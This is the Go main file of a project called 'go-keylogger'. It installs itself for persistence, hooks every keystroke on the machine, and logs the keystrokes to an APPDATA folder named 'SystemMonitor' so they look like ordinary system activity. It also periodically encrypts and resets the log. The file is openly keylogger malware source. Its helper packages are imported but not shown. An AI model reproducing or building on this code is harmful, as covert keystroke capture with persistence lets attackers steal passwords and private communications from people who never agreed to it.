package main

import (
	"go-keylogger/pkg/config"
	"go-keylogger/pkg/hook"
	"go-keylogger/pkg/keystream"
	"go-keylogger/pkg/logger"
	"go-keylogger/pkg/persistence"
	"log"
	"os"
	"path/filepath"
	"time"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--install" {
		if err := persistence.Install(); err != nil {
			log.Fatal("Installation failed:", err)
		}
		log.Println("Installed successfully")
		return
	}

	cfg := config.Load()
	logFilePath := filepath.Join(os.Getenv("APPDATA"), "SystemMonitor", "activity.log")
	fileLogger, err := logger.NewFileLogger(logFilePath)
	if err != nil {
		log.Fatal("Logger initialization failed:", err)
	}
	defer fileLogger.Close()

	keyProcessor := keystream.NewProcessor(fileLogger)

	if err := hook.Start(keyProcessor.HandleKeyEvent); err != nil {
		log.Fatal("Hook initialization failed:", err)
	}
	defer hook.Stop()

	log.Println("Keylogger started. Press Ctrl+C to exit...")
	
	for {
		time.Sleep(10 * time.Minute)
		if cfg.EncryptLogs {
			fileLogger.EncryptAndReset()
		}
	}
}
